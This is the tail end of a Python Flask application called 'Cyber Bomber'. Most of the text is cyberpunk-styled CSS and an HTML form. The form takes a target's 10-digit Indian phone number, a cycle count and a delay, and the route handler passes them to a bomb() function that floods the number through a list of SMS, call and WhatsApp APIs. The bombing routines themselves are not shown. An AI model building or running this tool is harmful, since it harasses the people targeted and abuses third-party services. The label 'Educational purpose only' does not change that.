            align-items: center;
            background: #0a0e17;
            font-family: 'Rajdhani', sans-serif;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: 
                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            z-index: 0;
            animation: gridMove 20s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.4;
            z-index: 0;
            animation: orbFloat 10s ease-in-out infinite alternate;
        }
        .orb1 { width: 300px; height: 300px; background: #ff0040; top: -100px; left: -100px; }
        .orb2 { width: 400px; height: 400px; background: #00f0ff; bottom: -150px; right: -150px; animation-delay: 3s; }
        .orb3 { width: 250px; height: 250px; background: #7a00ff; top: 50%; left: 50%; transform: translate(-50%,-50%); animation-delay: 6s; }
        @keyframes orbFloat {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(40px, -40px) scale(1.2); }
        }
        .card {
            position: relative;
            z-index: 1;
            background: rgba(10, 14, 23, 0.85);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(0, 255, 255, 0.15);
            border-radius: 32px;
            padding: 40px 35px;
            max-width: 560px;
            width: 100%;
            box-shadow: 0 30px 80px rgba(0,0,0,0.9), 0 0 40px rgba(0, 255, 255, 0.05);
            transition: 0.4s;
        }
        .card:hover {
            border-color: rgba(255, 0, 64, 0.3);
            box-shadow: 0 30px 80px rgba(0,0,0,0.9), 0 0 60px rgba(255, 0, 64, 0.1);
            transform: translateY(-2px);
        }
        .header { text-align: center; margin-bottom: 25px; }
        .logo {
            font-family: 'Orbitron', monospace;
            font-size: 32px;
            font-weight: 900;
            background: linear-gradient(135deg, #ff0040, #ff6b00, #ff0040);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 3s ease-in-out infinite;
            letter-spacing: 2px;
        }
        @keyframes shimmer {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .subtitle { color: #00f0ff; font-size: 14px; letter-spacing: 3px; text-transform: uppercase; margin-top: 4px; text-shadow: 0 0 20px rgba(0, 240, 255, 0.3); font-weight: 600; }
        .divider { height: 1px; background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.3), transparent); margin: 18px 0 25px 0; }
        .form-group { margin-bottom: 18px; }
        label { display: block; color: #8899bb; font-weight: 600; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 6px; }
        input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 14px;
            border: 1px solid rgba(0, 255, 255, 0.15);
            background: rgba(0, 0, 0, 0.4);
            color: #fff;
            font-size: 16px;
            font-family: 'Rajdhani', sans-serif;
            transition: 0.3s;
            outline: none;
        }
        input:focus {
            border-color: #00f0ff;
            box-shadow: 0 0 25px rgba(0, 240, 255, 0.1), inset 0 0 15px rgba(0, 240, 255, 0.05);
            background: rgba(0, 0, 0, 0.6);
        }
        input::placeholder { color: #3d4a66; }
        .row { display: flex; gap: 14px; flex-wrap: wrap; }
        .row .form-group { flex: 1; min-width: 120px; }
        .btn {
            width: 100%;
            padding: 16px 20px;
            border: none;
            border-radius: 50px;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            font-size: 16px;
            letter-spacing: 2px;
            text-transform: uppercase;
            color: #fff;
            background: linear-gradient(135deg, #ff0040, #ff6b00);
            cursor: pointer;
            transition: 0.4s;
            margin-top: 6px;
            box-shadow: 0 8px 30px rgba(255, 0, 64, 0.25);
            position: relative;
            overflow: hidden;
        }
        .btn::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
            transform: rotate(25deg) scale(0);
            transition: 0.6s;
        }
        .btn:hover::before { transform: rotate(25deg) scale(1); }
        .btn:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 12px 40px rgba(255, 0, 64, 0.5); }
        .btn:active { transform: scale(0.96); }
        .result-box {
            margin-top: 22px;
            padding: 16px 20px;
            border-radius: 16px;
            background: rgba(0, 255, 0, 0.04);
            border: 1px solid rgba(0, 255, 0, 0.12);
            color: #90ff90;
            text-align: center;
            font-weight: 600;
            font-size: 15px;
            word-break: break-word;
            backdrop-filter: blur(5px);
        }
        .result-box.error { background: rgba(255, 0, 0, 0.06); border-color: rgba(255, 0, 0, 0.15); color: #ff7a7a; }
        .footer {
            margin-top: 22px;
            text-align: center;
            font-size: 13px;
            color: #3d4a66;
            border-top: 1px solid rgba(255,255,255,0.03);
            padding-top: 18px;
        }
        .footer .credit { color: #00f0ff; font-weight: 700; font-size: 14px; text-shadow: 0 0 20px rgba(0, 240, 255, 0.2); }
        .footer .credit span { color: #ff6b00; }
        @media (max-width: 480px) {
            .card { padding: 28px 18px; }
            .logo { font-size: 24px; }
            .row { flex-direction: column; gap: 0; }
        }
    </style>
</head>
<body>
    <div class="orb orb1"></div><div class="orb orb2"></div><div class="orb orb3"></div>
    <div class="card">
        <div class="header">
            <div class="logo">💀 Cyber Bomber</div>
            <div class="subtitle">⚡ SMS · Call · WhatsApp</div>
        </div>
        <div class="divider"></div>
        <form method="POST">
            <div class="form-group">
                <label>📞 Target Phone</label>
                <input type="text" name="phone" placeholder="Enter 10-digit number" required pattern="[0-9]{10}" title="Exactly 10 digits">
            </div>
            <div class="row">
                <div class="form-group">
                    <label>🔄 Cycles</label>
                    <input type="number" name="cycles" value="2" min="1" max="20">
                </div>
                <div class="form-group">
                    <label>⏱️ Delay (sec)</label>
                    <input type="number" name="delay" value="2" min="0" max="10" step="0.5">
                </div>
                <div class="form-group" style="display:flex; align-items:flex-end; min-width:100px;">
                    <button type="submit" class="btn" style="margin:0;">💣 FIRE</button>
                </div>
            </div>
        </form>
        {% if result %}
            <div class="result-box {% if '❌' in result %}error{% endif %}">
                {{ result }}
            </div>
        {% endif %}
        <div class="footer">
            <div class="credit">🔰 Developed by <span>Arif</span></div>
            <div style="margin-top:4px; font-size:11px; color:#2a3a55;">⚠️ Educational purpose only</div>
        </div>
    </div>
</body>
</html>
"""
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone = request.form.get('phone', '').strip()
        cycles = int(request.form.get('cycles', 1))
        delay = float(request.form.get('delay', 2))
        
        # ভ্যালিডেশন
        if not phone.isdigit() or len(phone) != 10:
            return render_template_string(HTML_FORM, result="❌ Invalid phone number (must be 10 digits)")
        
        # ===== কুল-ডাউন চেক =====
        current_time = time.time()
        if phone in last_used:
            time_diff = current_time - last_used[phone]
            if time_diff < COOLDOWN_SECONDS:
                remaining = int(COOLDOWN_SECONDS - time_diff)
                minutes = remaining // 60
                seconds = remaining % 60
                return render_template_string(
                    HTML_FORM, 
                    result=f"⏳ This number was used recently. Please wait {minutes}m {seconds}s before trying again."
                )
        
        # ব্যবহারের সময় রেকর্ড করুন
        last_used[phone] = current_time
        
        # সাইকেল ও ডেলায় ক্যাপ (অপশনাল, নিরাপত্তার জন্য)
        cycles = min(cycles, 5)
        delay = max(3, delay)
        
        apis = get_working_apis()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        success, total = loop.run_until_complete(bomb(phone, apis, cycles, delay))
        loop.close()
        
        return render_template_string(
            HTML_FORM, 
            result=f"✅ {success} successful out of {total} requests sent to +91{phone}"
        )
    
    return render_template_string(HTML_FORM, result=None)
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)